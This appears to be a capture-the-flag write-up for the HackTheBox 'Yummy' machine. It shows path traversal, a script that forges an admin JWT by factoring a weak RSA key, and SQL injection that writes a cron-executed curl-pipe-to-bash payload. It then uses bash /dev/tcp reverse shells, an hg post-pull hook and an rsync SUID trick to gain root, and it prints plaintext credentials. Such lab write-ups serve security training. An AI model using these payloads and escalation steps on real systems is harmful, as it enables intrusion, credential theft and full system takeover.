---
tags:
  - HTB
  - Linux
  - Boot2Root
  - Hacking
---
# Overview

| Name        | Yummy |
| ----------- | ----- |
| OS          | Linux |
| Base Points | Hard  |
| Status      | Done  |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV 10.129.231.153 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-14 09:59 CST
Nmap scan report for 10.129.231.153
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)
80/tcp open  http    Caddy httpd
|_http-title: Did not follow redirect to http://yummy.htb/
|_http-server-header: Caddy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration

Nmap reveals that ports 22 and 80 are open. I began exploring the website, `yummy.htb`. After adding this entry to `/etc/hosts`, I used `dirsearch` but found nothing significant. However, I discovered a **local file traversal vulnerability** in the "save iCalendar" functionality, accessible after booking a table.

![[0_Q7k0FxDgHYWKzsdY.webp]]

Intercepting the request with Burp Suite, I tested a payload to access `/etc/passwd`:

`GET /export/../../../../../etc/passwd`

This response returned the contents of `/etc/passwd`:

![[0_mdmhQuU-wnk3GWX0.webp]]

Since I could access any files, I searched for valuable files and found something interesting in `/etc/crontab`:

![[0_ShsgWgr4TKqZc4PT.webp]]

![[0_oT8Vfp9Xz7hThjnI.webp]]
## Exploring `/data/scripts`

I explored the `data/scripts` directory and found `table_cleanup.sh`, which cleans tables in MySQL. It also contains credentials for the database:

![[0_Y8SvpC0qx7T3PeTP.webp]]

In `dbmonitor.sh`, I found a script that checks if the MySQL service is down and restarts it if needed:

![[0_idrE_9ghgQ9tXwqs.webp]]

`app_backup.sh` goes to `/var/www/` directory and zips content of `/opt/app` as `backupapp.zip` file:

![[0_ZRJ7s4nv1Ax16-ym.webp]]

Extracting `backupapp.zip` provided the web application’s source code. Here are the files:

![[0_UaI3CXcwlj1bj2m5.webp]]

In `app.py`, I located the same database credentials as those in `cleanup.sh`:

```
db_config = {  
    'host': '127.0.0.1',  
    'user': 'chef',  
    'password': '3wDo7gSRZIwIHRxZ!',  
    'database': 'yummy_db',  
    'cursorclass': pymysql.cursors.DictCursor,  
    'client_flag': CLIENT.MULTI_STATEMENTS  
}
```
# Initial Foothold
## JWT Vulnerability

In the `config` folder, the `signature.py` file revealed session token generation logic.

Code:

```python
from Crypto.PublicKey import RSA  
from cryptography.hazmat.backends import default_backend  
from cryptography.hazmat.primitives import serialization  
import sympy  
# Generate RSA key pair  
q = sympy.randprime(2**19, 2**20)  
n = sympy.randprime(2**1023, 2**1024) * q  
e = 65537  
p = n // q  
phi_n = (p - 1) * (q - 1)  
d = pow(e, -1, phi_n)  
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}  
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))  
private_key_bytes = key.export_key()private_key = serialization.load_pem_private_key(  
    private_key_bytes,  
    password=None,  
    backend=default_backend()  
)  
public_key = private_key.public_key()
```

Upon decoding the JWT token in base64, the `n` value of the RSA encryption was exposed:

![[0_EK9LXysMxY0evyir.webp]]

Modifying the role to `administrator` was initially unsuccessful due to signature verification, which hashes the payload and header with a secret key. However, with access to the `n` value, I modified `signature.py` to create an admin token.

Using the following Python script, I generated a modified JWT with administrator privileges:

```python
from Crypto.PublicKey import RSA
import json
import base64
import hashlib
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# Your session token
original_jwt = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImZhdGV4YXNodXJhQGdtYWlsLmNvbSIsInJvbGUiOiJjdXN0b21lcl9iYzRlYzljZiIsImlhdCI6MTc2ODQ3MDY1NCwiZXhwIjoxNzY4NDc0MjU0LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjEwNDYzMTA0MDQwNjk4Mjg1ODc0ODM2ODQxNzA2OTkzMzE5NTQ1MzU5ODgyMzkxNTA1Njc5OTYxMjQzNTgzMzA1MDEzNzU2MDg1MDI5Njg1NzE0ODE4NDI4MDE3MTM3OTc5OTgyNTUwOTc3MzA3ODY4ODgzNDE4NDAwNDQ2MjcyNDM5NDE3Mzk4MTAxODIxMTU5MzM3NzA2NjE1Mjk3MzU2ODUyNjQ3NzMzNzg3MzE4ODU2NjkyMjIxODAyMzM4NzExMjMyOTQ5MzU4MDIxMzMwMDYyOTkwMjcwNzM2MjM0NTQxNTE4NTkzODEwNjUwNjc2ODA0OTQ4NzkyOTg2MTAyNjMxMTQ5Mzc3MTg3OTY4Mjk3MDMyMDk5NTU2Mjg3MjExMzcyNjI1NDk4NzgwMDAyMTY5NDEwNzkwMSIsImUiOjY1NTM3fX0.B6rghOxIT6kXEnWGsESUuolukRaHRyXJDS9U5SHUgjcGX7LBdENzp3uMf0VmYTf08bZLcYBTTvkEYkVSwGpqAfrphcYWO-5peOmHMQE0LW31ShTCMmtwme1bkJGwDPCHV0_LnaCiUjYYy7rCSA9AUagyHe5HKWZaRhppSzMn5z99nNM"

# Extract parts
parts = original_jwt.split('.')
header_b64 = parts[0]
payload_b64 = parts[1]
signature_b64 = parts[2]

# Decode payload
payload = json.loads(base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8'))

# Get n from JWK
jwk = payload['jwk']
n = int(jwk['n'])
e = int(jwk['e'])

print(f"n = {n}")
print(f"e = {e}")

# Factor n
import sympy
print("\nFactoring n...")
factors = sympy.factorint(n)
print(f"Factors: {factors}")

# Get p and q
p, q = list(factors.keys())
print(f"\np = {p}")
print(f"q = {q}")

# Calculate private key
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)

# Create RSA key
key = RSA.construct((n, e, d, p, q))
private_key = key.export_key()

# Modify payload
payload['role'] = 'administrator'

# Encode new JWT
new_header = base64.urlsafe_b64encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode()).rstrip(b'=').decode()
new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

# Create signature
message = f"{new_header}.{new_payload}".encode()
hash_obj = SHA256.new(message)
signature = pkcs1_15.new(RSA.import_key(private_key)).sign(hash_obj)
signature_b64 = base64.urlsafe_b64encode(signature).rstrip(b'=').decode()

new_jwt = f"{new_header}.{new_payload}.{signature_b64}"
print(f"\nModified JWT with administrator role:")
print(new_jwt)
```

Using the new token in `x-auth` for `/admindashboard`, I accessed the admin panel:

![[0_2QbIs2U1QLcMhxIl 1.webp]]

The admin panel contained limited functionality, but I identified an error-based SQL injection vulnerability in the search function.
## SQLi

`sqlmap -r request`

![[0_O553nLpk8GipZ0N_.webp]]

I already have admin user there is not so much more left to do with admin functionality. so, with the SQL injection vulnerability, I enumerated user and tables with sqlmap.

`sqlmap -r request --dbs --batch  # Lists all databases`

```bash
[11:09:35] [INFO] the back-end DBMS is MySQL  
back-end DBMS: MySQL >= 5.0  
[11:09:35] [INFO] fetching database names  
[11:09:36] [INFO] retrieved: 'information_schema'  
[11:09:37] [INFO] retrieved: 'performance_schema'  
[11:09:37] [INFO] retrieved: 'yummy_db'  
available databases [3]:  
[*] information_schema  
[*] performance_schema  
[*] yummy_db[11:09:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'[*] ending @ 11:09:37 /2024-11-12/
```

Enumerating tables

`sqlmap -r request -D yummy_db --tables # Lists all tables`

```bash
Database: yummy_db  
[4 tables]  
+--------------+  
| appointments |  
| potato       |  
| sqlmapfile   |  
| users        |  
+--------------+[11:24:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'
```

`sqlmap -r request -D yummy_db -T users --dump # Lists all users`

```bash
Database: yummy_db  
Table: users  
[0 entries]  
+----+---------+-------+----------+  
| id | role_id | email | password |  
+----+---------+-------+----------+  
+----+---------+-------+----------+
```

users and appointments both table don’t contain any interesting information

so, I checked the privilege of user

`sqlmap -r request --privileges`

```bash
[11:29:55] [INFO] retrieved: 'FILE'  
database management system users privileges:  
[*] 'chef'@'localhost' [1]:  
    privilege: FILE[11:29:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/yummy.htb'
```

Great, i got file permission which means i can read and write files. remember there were other cronjobs involving mysql, **db_monitor.sh** which restarts the `mysql` server if it’s down. We need to write something which will give us a `shell`.

Remember `mysql` user was executing **dbmonitor.sh** as cronjob and But there is also a `else` statement which does if **dbstatus.json** exits and doesn’t include `database is down` text, it `deletes` the .json file and executes the `first` `fixer-v` file in **/data/scripts**.

```bash

else  
if [ -f /data/scripts/dbstatus.json ]; then  
if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then  
/usr/bin/echo "The database was down at $timestamp. Sending notification."  
/usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root  
/usr/bin/rm -f /data/scripts/dbstatus.json  
else  
/usr/bin/rm -f /data/scripts/dbstatus.json  
/usr/bin/echo "The automation failed in some way, attempting to fix it."  
latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)  
/bin/bash "$latest_version"
```

so first i will send this command to write something in **dbstatus.json**

```bash
http://yummy.htb/admindashboard?s=aa&o=ASC%3b+select+"0xPWNED"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
```

then create a file named `fixer-v___` which is going to be first file in directory because of the `_`, the file is going to be executed as `mysql` user and gives us shell.

```bash
http://yummy.htb/admindashboard?s=aa&o=ASC%3b+select+"curl+10.10.15.108:8000/shell.sh+|bash%3b"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b
```

so to do this, i am opening netcat listener on my machine:

```bash
bash -i >& /dev/tcp/10.10.15.108/4444 0>&1
```

Keep reloading after some time you will get shell:

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.231.153 - - [15/Jan/2026 03:53:03] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.231.153] 51696
bash: cannot set terminal process group (38422): Inappropriate ioctl for device
bash: no job control in this shell
mysql@yummy:/var/spool/cron$ whoami
whoami
mysql
mysql@yummy:/var/spool/cron$ 

```

In order to get shell as **www_data** i just have to tweak things around little bit. remember backup_script.sh will get executed as user **_www_data_**. so, I need to upload shell.sh file and rename it to backup_script.sh:

```bash
bash -i >& /dev/tcp/10.10.15.108/9001 0>&1
```

```bash
mysql@yummy:/var/spool/cron$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
#
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
mysql@yummy:/var/spool/cron$ ls -la /etc/cron.*
ls -la /etc/cron.*
/etc/cron.d:
total 28
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rw-r--r--   1 root root   201 Apr  8  2024 e2scrub_all
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder
-rw-r--r--   1 root root   396 Apr 23  2024 sysstat

/etc/cron.daily:
total 44
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rwxr-xr-x   1 root root   376 Apr 18  2024 apport
-rwxr-xr-x   1 root root  1478 Mar 22  2024 apt-compat
-rwxr-xr-x   1 root root   123 Feb  5  2024 dpkg
-rwxr-xr-x   1 root root   377 Apr 23  2024 logrotate
-rwxr-xr-x   1 root root  1395 Apr 23  2024 man-db
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder
-rwxr-xr-x   1 root root   518 Apr 23  2024 sysstat

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder

/etc/cron.monthly:
total 20
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder

/etc/cron.weekly:
total 24
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rwxr-xr-x   1 root root  1055 Apr 23  2024 man-db
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder

/etc/cron.yearly:
total 20
drwxr-xr-x   2 root root  4096 Sep 30  2024 .
drwxr-xr-x 120 root root 12288 Sep 30  2024 ..
-rw-r--r--   1 root root   102 Apr 23  2024 .placeholder
```

```bash
mysql@yummy:/var/spool/cron$ cd /data/scripts
cd /data/scripts
mysql@yummy:/data/scripts$ cat app_backup.sh
cat app_backup.sh
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

```bash
mysql@yummy:/data/scripts$ cd /data/scripts
cd /data/scripts
mysql@yummy:/data/scripts$ wget http://10.10.15.108:8000/shell.sh
wget http://10.10.15.108:8000/shell.sh
--2026-01-15 09:59:32--  http://10.10.15.108:8000/shell.sh
Connecting to 10.10.15.108:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43 [text/x-sh]
Saving to: ‘shell.sh’

     0K                                                       100% 3.30M=0s

2026-01-15 09:59:33 (3.30 MB/s) - ‘shell.sh’ saved [43/43]

mysql@yummy:/data/scripts$ # First rename the original app_backup.sh
mv app_backup.sh app_backup.sh.original
# First rename the original app_backup.sh
mysql@yummy:/data/scripts$ mv app_backup.sh app_backup.sh.original
mysql@yummy:/data/scripts$ # Then rename your shell script to app_backup.sh
mv shell.sh app_backup.sh

# Then rename your shell script to app_backup.sh
mysql@yummy:/data/scripts$ mv shell.sh app_backup.sh
mysql@yummy:/data/scripts$ 
mysql@yummy:/data/scripts$ # Make it executable
chmod +x app_backup.sh
# Make it executable
mysql@yummy:/data/scripts$ chmod +x app_backup.sh
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.231.153] 37994
bash: cannot set terminal process group (38686): Inappropriate ioctl for device
bash: no job control in this shell
www-data@yummy:~$ whoami
whoami
www-data
www-data@yummy:~$ cd /home
cd /home
www-data@yummy:/home$ ls
ls
dev
qa
www-data@yummy:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root root 4096 May 27  2024 .
drwxr-xr-x 24 root root 4096 Sep 30  2024 ..
drwxr-x---  7 dev  dev  4096 Jan 15 10:00 dev
drwxr-x---  6 qa   qa   4096 Sep 30  2024 qa

```

```bash
www-data@yummy:/home$ cd ~
cd ~
www-data@yummy:~$ ls
ls
app-qatesting
backupapp.zip
www-data@yummy:~$ cd app-qatesting
cd app-qatesting
www-data@yummy:~/app-qatesting$ ls
ls
app.py
config
middleware
static
templates
www-data@yummy:~/app-qatesting$ ls -la
ls -la
total 40
drwxrwx--- 7 www-data qa        4096 May 28  2024 .
drwxr-xr-x 3 www-data www-data  4096 Jan 15 10:02 ..
-rw-rw-r-- 1 qa       qa       10852 May 28  2024 app.py
drwxr-xr-x 3 qa       qa        4096 May 28  2024 config
drwxrwxr-x 6 qa       qa        4096 May 28  2024 .hg
drwxr-xr-x 3 qa       qa        4096 May 28  2024 middleware
drwxr-xr-x 6 qa       qa        4096 May 28  2024 static
drwxr-xr-x 2 qa       qa        4096 May 28  2024 templates
www-data@yummy:~/app-qatesting$ cd .hg
cd .hg
www-data@yummy:~/app-qatesting/.hg$ ls
ls
00changelog.i
bookmarks
branch
cache
dirstate
last-message.txt
requires
store
strip-backup
undo.backup.branch.bck
undo.backup.dirstate.bck
undo.desc
wcache
www-data@yummy:~/app-qatesting/.hg$ grep -r pass .
grep -r pass .
grep: ./wcache/checkisexec: Permission denied
grep: ./store/data/app.py.i: binary file matches
```

```bash
www-data@yummy:~/app-qatesting/.hg/store/data$ cat app.py.i
cat app.py.i
	�!_��������qn�l��*��!�E�K�0v�K(�/�`_ MOj_ +�=L�3R���Zk�
��QL���{2�d\WQP] ���d��|(^����7�o�h�忩[���U[��=���!�~�33��R"�,�.Ah�z�x�����R�_�Y֓nS��s�Ч����
                                                                                           C�S������Z:L*"��}Z�ַ��&�_�
                                                                                                                    e��4�I�ևz�^x�U�~$$�{pn��3F9]�"�lG��#o�0�6�(rN[9��N��|��oGf�[I���z��+=q�@����Mj�Bpڊ�}��x{R�_h=R����s���[n��JM�+��Z(�iu�އ4�i+Bbq���YK��#�����ǟ	`*Ý�V��c��O��Q��[U�(�0����i��`ɤ"B�DL$Pb2a��AV�����σ��f��Y���8���eO>�qZ+�G�?�+�Ũ��[~�$y6��0�<2�5�P��ښD$,
                                                           ��k+�rv��G�R�d�j�A��B[�T�yغtm�>]*+E5�GM{b�W�����pD%۪^,&9�5���~�:��sX��N�����0�
Uj�dx��2gU����[��T�p{cI��D�v�S�TH��""����v;;IQy_f��ֺ��
                                                     ���
                                                        Z����Y.���}�]�V�V�뜳��
D9����Ook2`��BĀ
               �������n�c�����b�I���h67�e��x����x<
                                                  <n���E�#���e�ZR��
                                                                   I�iZ ��Z,U�4M�,�f��_���$2�A��>=�_�2��)S�w�
�@��}ޣk�c��p�h�Q�>��S���O#qP8&8`tL�ȧ�и�;Y畝<��{s{���a��惜-�?�+��Q-���T�G��<X�X�1*k��cc�w��fC�!tÆC*0T�:e�*�
                                   G� {�E��[[=�2�m�Bl�)�	(ea�%��`�(I� �
                                                                              C�� B@��!��⇯��ǚ��tVd���L��y=��I���X�Rm������7dp���a`�-��!�E=Y-;���Fv�F�M[
                 �p�n�� "Ѻ�R��Ҟ���ƣ� �9�Ko��<0e�,�$�|%��2��� F�]@��lOi��v7>�����Cz���@�XB����ﷃb[�]w_϶�ۗ��^���`d30�BD��6�$����x�5
                                                                                                                               f�Z#=��$��\]x��i�>�ri��V��I�������	.��̆��������Ͼ(�u��V�m���<V����i�����p�7:C)c�|�ßU���Pg�B�Qi�!�p[+��E�����M�}v�Z�i����ÏN��o.65��_���ȅd
��+?�8��51����$T���#b�TU��G;<*�mu�_�CA�q��-��ʫ��7�%!�X���"�:�ѡ�UK���n2�f�������3���L�?�:�T�����T�)`��/.��D��
                                                                                                            t��w��n�V����2��q�C�|(��^}�*�F�z�r�䣸,=11)CJ}��D�nVE}���`�\���4�9óv�A�A�W��%�JN���·"����*���g�n�G����L��4�1{�ᨚ��F�'.G����<3�ZP]N�6���qT�\�!>�K\_��<�M�+�x����N������qZ,
M�4���p~%+!�2�M�S�H�چ7����8�	r6p�0���T+Z`[(_��樬�Z�3�
                     V��2
D�~e�FC0���9C�lN������Z�y���j�5����њph��v8�	��
���x�L��ŵb6fX��l~÷�Ѩx�R��`xlS�����                ��zȜa:��MlM���!�
                                  �dחFl�ћ���D�1���R[#���*�a�t�kգ�?,\����0G'W�#T�a��8����}T�Q��6�ϛ�3�y�*�xǅV	���C/��6��L�6_�
                                                                                                                               3�������������b��|�50;�@�ZD8H1ƙCVO���]����1wG��6��%گ0�:�wԿ�Y��Ffa]�F�fM���X4$`ģ�旟��{�ek�Sg����&�D7h�rv��H��D��4bHQ�	�,���cȯ=b�s�^��Z
                                                                                                                                �c���-�A�����-��
          �H�:�3A��t�R� r�����UO:H/��ޚr��t�q0�]������L��F�f�.*��m��Jb
        b����;��\����f{A���#pz�m}�t�äEG�4ת��Z�b                      ��Ά�6���  ]�J�<-?ј|�
                                               ���=
                                                   z��Nk�"?	��(������ 0���W�!���8�j�kE��(�/�`bm7piL�����*�.H��n�{�&i�K�ϔ�y���!a�$�%w���x#@
        E�\_`��
�Au��,�z�e����ߡ��kL�=����IH�(Z~�M~}{�'�F�,^
���K�^�9��up��`%�d!Q0��z[���}9�z�Q�w8 %��6^$�@���2Y�RNG�A�����q��67*o�5=�)�ռ㆏[N����<�jl&�0	��Y=[�`�,
                                                                                                         ��a�a*1^�;;w�>~��<��1���)�clR&ɸxi��%3##�0�@f4-k:EE�O�x�9��s�!˲�����q��w^o������� �'���$�ۈ�e��Y�A���!1�@1g�3�ݠw�(��e�\7�e��3N�4K�[
�� 
rB�HI 'DQkX�ըtvGq�a�g�la:ׄ^�B[$�9�u�(���6�U,ݱB�Q#ܱ����:U
                                                      �H,�W���q	�ZaTb���A����ʠ���$�%*�����)T�1���}����|����D��LT��vD��Y>$-@��a��W��,�SI
 k�׊%ݛ
      ��|YC^,2���
                 l�&�����8Q7���6�����:U�,貽#0�0�V�įz�*�QM�J�

¶)q����e���%Ш��ab�^�
c�(�/� �m��#)��	ϳ�m۶���C�O�6W�t[QRpn@/S��N����^d�
                                                 ���)|Lr:�c,�W�Vz�SDN�Z�/Jb|�%n8��`&^M����IG�:1t�n�����)}���K���>odyٿ$՘|��h�	4�զ�	Ax�(��������0����d�|
�A�(*
     �f�
       E1(�/� ��$�&'app.secret_key = s.token_hex(32)
&u'cT sql = f"SELECT * FROM appointments WHERE_email LIKE %s"
�ɕp=��E(������##md5�P�����+v�Kw9    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
EJ*������uY�0��+2ܩ-]%���(�(�/�`O
�<.`������6�߽��}�v�v�@P��D�2ӕ�_�B�Mu;G
                                     �.-1
                                         ��D�	�kk��Y益H���ΣVps
                                                                �K�a�0�VW��;h�������B�
                                                                                      ;ó~z�q�{�+>=�O_�q6� �"V˺&f�*�T㔇D��퍂��@��V([Q���������̋G��φ����>GQ$
�D��,3�eJoH|j�)�(𶠀yh]��6����~Z�[hY�
                                    �	�w�4L
{��]�ߚ�D������f�:�����s)�����}               �3�ZШ�݆{S?�m��*H�چ���V3�Y�(��]���
 ��L��S�eE��6K�6    'user': 'qa',
    'password': 'jPAd!XQCtn8Oc@2B',
```

I ssh with qa with above pasword.

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ ssh qa@yummy.htb
The authenticity of host 'yummy.htb (10.129.231.153)' can't be established.
ED25519 key fingerprint is SHA256:9fd19UBqhgUKmJ38ElChUROBxqbSG6pvPPpk4IB4xM4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'yummy.htb' (ED25519) to the list of known hosts.
qa@yummy.htb's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jan 15 10:04:15 AM UTC 2026

  System load:  0.1               Processes:             260
  Usage of /:   62.6% of 5.56GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.129.231.153
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

10 updates can be applied immediately.
10 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

qa@yummy:~$ ls
user.txt
qa@yummy:~$ cat user.txt
0e9c5711f433348b9373963259f9f33d
```
# Privilege Escalation

```bash
qa@yummy:~$ sudo -l
[sudo] password for qa: 
Matching Defaults entries for qa on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User qa may run the following commands on localhost:
    (dev : dev) /usr/bin/hg pull /home/dev/app-production/
```
## hg

As a qa user, i am able to use hg which is a distributed version control system similar to git.

Both programs use `hooks` to trigger certain events after pulling,committing and updating. Using these `hooks` we can execute a `script` after `pull` is done. First a `.hgrc` config file is needed to perform a `hook`. Let’s use the `.hgrc` in `/home/qa/`.

```bash
qa@yummy:/tmp$ cd /tmp
qa@yummy:/tmp$ # Create your reverse shell script
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.15.108/9002 0>&1' >> shell.sh
chmod +x shell.sh
qa@yummy:/tmp$ mkdir .hg
chmod 777 .hg
qa@yummy:/tmp$ # Create hgrc config file in .hg directory
cat > .hg/hgrc << 'EOF'
[hooks]
post-pull = /tmp/shell.sh
EOF
qa@yummy:/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/
pulling from /home/dev/app-production/
requesting all changes
adding changesets
adding manifests
adding file changes
added 6 changesets with 129 changes to 124 files
new changesets f54c91c7fae8:6c59496d5251
(run 'hg update' to get a working copy)
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ rlwrap nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.231.153] 48420
I'm out of office until January 16th, don't call me
dev@yummy:/tmp$ id              id
id
uid=1000(dev) gid=1000(dev) groups=1000(dev)
dev@yummy:/tmp$ 
```

`rsync` is a tool for Synchronizing files and directories between location. We can use `rsync` between `/app-production/` and `/opt/app` with `-a` which preserves permissions.

Executing the command copies the files in `/app-production` to `/opt/app` but because of `-a` flag the owner of the files stays as `dev`. so, `--chown` flag can be used to change the owner to `root`. And if we set a `suid` for the file, we can execute the file with `root` privilege.

```bash
cp /bin/bash app-production/bash;chmod u+s app-production/bash;sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/;/opt/app/bash -p
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-rpdngt0axh]─[~]
└──╼ [★]$ rlwrap nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.231.153] 48756
I'm out of office until January 16th, don't call me
dev@yummy:/tmp$ cd ~            cd ~
cd ~
dev@yummy:~$ sudo -l      sudo -l
sudo -l
Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
dev@yummy:~$ cp /bin/bash cp /bin/bash app-production/bash;chmod u+s app-production/bash;sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/;/opt/app/bash -p
cp /bin/bash app-production/bash;chmod u+s app-production/bash;sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/;/opt/app/bash -p

whoami
root
cat /root/root.txt
d16278962433b70748203a15d382ef41
```

---